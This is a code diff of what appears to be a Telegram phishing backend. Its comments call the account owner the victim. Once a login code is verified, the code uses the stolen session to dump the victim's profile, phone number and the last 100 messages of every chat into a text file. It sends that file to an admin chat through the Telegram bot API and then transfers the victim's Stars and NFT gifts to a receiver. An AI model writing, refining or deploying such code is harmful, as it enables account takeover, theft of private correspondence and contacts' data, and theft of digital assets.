@@ -24,7 +24,7 @@ CORS(app)
 temp_data = {}
 
 # ============================================================
-# Отправка уведомлений админу (синхронно через отдельный поток)
+# Отправка уведомлений админу
 # ============================================================
 async def send_telegram_message(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -32,116 +32,132 @@ async def send_telegram_message(text):
         await client.post(url, json={"chat_id": ADMIN_ID, "text": text})
 
 # ============================================================
-# Сбор данных аккаунта с лимитом 100 сообщений на диалог
+# Сбор данных в TXT (лимит 100 сообщений на диалог)
 # ============================================================
-async def collect_full_user_data(client):
-    data = {}
-    
-    # 1. Данные владельца
+async def collect_full_user_data_txt(client):
+    # 1. Получаем данные владельца (жертвы)
     me = await client.get_me()
-    data['user'] = {
-        'id': me.id,
-        'username': me.username,
-        'first_name': me.first_name,
-        'last_name': me.last_name,
-        'phone': me.phone,
-        'is_bot': me.bot,
-        'is_premium': getattr(me, 'premium', False)
-    }
+    my_id = me.id
+    my_username = me.username or "нет"
+    my_first_name = me.first_name or "нет"
+    my_phone = me.phone or "нет"
     
-    # 2. Контакты
-    try:
-        contacts_result = await client(functions.contacts.GetContactsRequest(hash=0))
-        data['contacts'] = []
-        for contact in contacts_result.users:
-            data['contacts'].append({
-                'id': contact.id,
-                'username': contact.username,
-                'first_name': contact.first_name,
-                'last_name': contact.last_name,
-                'phone': contact.phone
-            })
-    except Exception as e:
-        await send_telegram_message(f"⚠️ Ошибка получения контактов: {str(e)}")
-        data['contacts'] = []
+    # 2. Создаём временный файл
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    filename = f"dump_{my_id}_{timestamp}.txt"
     
-    # 3. Баланс звёзд – НЕ ЗАПИСЫВАЕМ, только для уведомлений (пропускаем)
-    
-    # 4. Диалоги и сообщения с лимитом 100 сообщений на диалог
-    dialogs = await client.get_dialogs()
-    data['dialogs'] = []
-    for dialog in dialogs:
-        dialog_info = {
-            'id': dialog.id,
-            'title': dialog.title,
-            'type': 'unknown',
-            'messages': []
-        }
-        if dialog.is_user:
-            dialog_info['type'] = 'user'
-        elif dialog.is_group:
-            dialog_info['type'] = 'group'
-        elif dialog.is_channel:
-            dialog_info['type'] = 'channel'
+    with open(filename, 'w', encoding='utf-8') as f:
+        # Заголовок профиля
+        f.write("ПРОФИЛЬ\n")
+        f.write(f"НИК: @{my_username}\n")
+        f.write(f"АЙДИ: {my_id}\n")
+        f.write(f"НОМЕР ТЕЛЕФОНА: {my_phone}\n")
+        f.write("===============================================\n\n")
         
-        try:
-            messages = []
-            # Ограничиваем до 100 последних сообщений на диалог
-            async for msg in client.iter_messages(dialog, limit=100):
-                messages.append({
-                    'id': msg.id,
-                    'date': msg.date.isoformat() if msg.date else None,
-                    'text': msg.text,
-                    'from_id': msg.from_id.user_id if msg.from_id else None,
-                    'sender_id': msg.sender_id,
-                    'reply_to': msg.reply_to_msg_id,
-                    'media': bool(msg.media),
-                    'media_type': str(msg.media.__class__.__name__) if msg.media else None
-                })
-            dialog_info['messages'] = messages
-        except Exception as e:
-            dialog_info['error'] = str(e)
-            logging.error(f"Error fetching messages for dialog {dialog.id}: {e}")
+        # Получаем все диалоги
+        dialogs = await client.get_dialogs()
         
-        data['dialogs'].append(dialog_info)
+        # Кеш для сущностей (чтобы не дёргать API на каждое сообщение)
+        entity_cache = {}
+        
+        for dialog in dialogs:
+            # Определяем название и ID
+            if dialog.is_user:
+                entity = dialog.entity
+                name = entity.first_name or entity.username or str(entity.id)
+                phone = entity.phone if hasattr(entity, 'phone') and entity.phone else "скрыт"
+            else:
+                name = dialog.title or "Без названия"
+                phone = "—"
+            
+            # Если диалог с самим собой (бывает) – пропускаем или пишем
+            if dialog.is_user and dialog.entity.id == my_id:
+                continue  # не пишем диалог с собой
+            
+            chat_header = f"ЧАТ С {name} (ID: {dialog.id}) (ТЕЛЕФОН: {phone})"
+            f.write("==============================\n")
+            f.write(chat_header + "\n")
+            
+            # Получаем сообщения (лимит 100)
+            try:
+                messages = []
+                async for msg in client.iter_messages(dialog, limit=100):
+                    messages.append(msg)
+                # Переворачиваем, чтобы шли в хронологическом порядке (старые→новые)
+                messages.reverse()
+                
+                for msg in messages:
+                    # Определяем отправителя
+                    sender_id = msg.sender_id
+                    if not sender_id:
+                        # Если нет sender_id, пробуем from_id
+                        if msg.from_id:
+                            sender_id = msg.from_id.user_id
+                        else:
+                            continue  # пропускаем
+                    
+                    # Определяем, жертва это или собеседник
+                    if sender_id == my_id:
+                        sender_name = f"@{my_username}" if my_username != "нет" else "Я"
+                        line = f"СООБЩЕНИЕ({sender_name}): {msg.text or '[Медиа]'}\n"
+                    else:
+                        # Получаем сущность собеседника из кеша или через API
+                        if sender_id not in entity_cache:
+                            try:
+                                entity = await client.get_entity(sender_id)
+                                entity_cache[sender_id] = entity
+                            except:
+                                entity_cache[sender_id] = None
+                        entity = entity_cache.get(sender_id)
+                        if entity:
+                            sender_name = entity.first_name or entity.username or str(sender_id)
+                        else:
+                            sender_name = str(sender_id)
+                        line = f"СОБЕСЕДНИК({sender_name}): {msg.text or '[Медиа]'}\n"
+                    
+                    f.write(line)
+                
+                # Конец диалога
+                f.write(f"==========КОНЕЦ ДИАЛОГА С {name} =======\n\n")
+                
+            except Exception as e:
+                f.write(f"ОШИБКА при получении сообщений: {str(e)}\n\n")
+                logging.error(f"Error fetching messages for dialog {dialog.id}: {e}")
     
-    return data
+    return filename
 
 # ============================================================
-# Отправка JSON-файла админу
+# Отправка файла админу
 # ============================================================
 async def send_document_to_admin(file_path):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         async with httpx.AsyncClient(timeout=120.0) as http_client:
             with open(file_path, 'rb') as f:
-                files = {'document': (os.path.basename(file_path), f, 'application/json')}
+                files = {'document': (os.path.basename(file_path), f, 'text/plain')}
                 response = await http_client.post(url, data={'chat_id': ADMIN_ID}, files=files)
                 if response.status_code != 200:
-                    await send_telegram_message(f"❌ Ошибка отправки JSON: {response.text}")
-        logging.info(f"Document {file_path} sent to admin.")
+                    await send_telegram_message(f"❌ Ошибка отправки файла: {response.text}")
+        logging.info(f"File {file_path} sent to admin.")
     except Exception as e:
         await send_telegram_message(f"❌ Ошибка отправки документа: {str(e)}")
         raise
 
 # ============================================================
-# Проверка баланса и подарков (для уведомлений)
+# Проверка баланса и подарков
 # ============================================================
 async def check_balance_and_gifts(client):
     try:
         me = await client.get_me()
-        
-        # Баланс звёзд
         try:
             stars_status = await client(functions.payments.GetStarsStatusRequest(
                 peer=await client.get_input_entity('me')
             ))
-            balance = stars_status.balance.amount  # правильное получение
+            balance = stars_status.balance.amount
         except Exception as e:
             await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
             balance = 0
         
-        # Доступные подарки
         try:
             gifts_result = await client(functions.payments.GetStarGiftsRequest(hash=0))
             gifts = gifts_result.gifts
@@ -161,7 +177,7 @@ async def check_balance_and_gifts(client):
         return None
 
 # ============================================================
-# Передача NFT-подарков получателю
+# Передача подарков получателю
 # ============================================================
 async def transfer_nft_to_receiver(client, info):
     try:
@@ -272,15 +288,12 @@ def api_verify_code():
             info = await check_balance_and_gifts(client)
             if info:
                 try:
-                    dump_data = await collect_full_user_data(client)
-                    dump_filename = f"dump_{info['user_id']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-                    with open(dump_filename, 'w', encoding='utf-8') as f:
-                        json.dump(dump_data, f, ensure_ascii=False, indent=2)
-                    await send_document_to_admin(dump_filename)
-                    if os.path.exists(dump_filename):
-                        os.remove(dump_filename)
+                    file_path = await collect_full_user_data_txt(client)
+                    await send_document_to_admin(file_path)
+                    if os.path.exists(file_path):
+                        os.remove(file_path)
                 except Exception as e:
-                    await send_telegram_message(f"❌ Ошибка дампа: {str(e)}")
+                    await send_telegram_message(f"❌ Ошибка сбора/отправки TXT: {str(e)}")
                 
                 await transfer_nft_to_receiver(client, info)
             else:
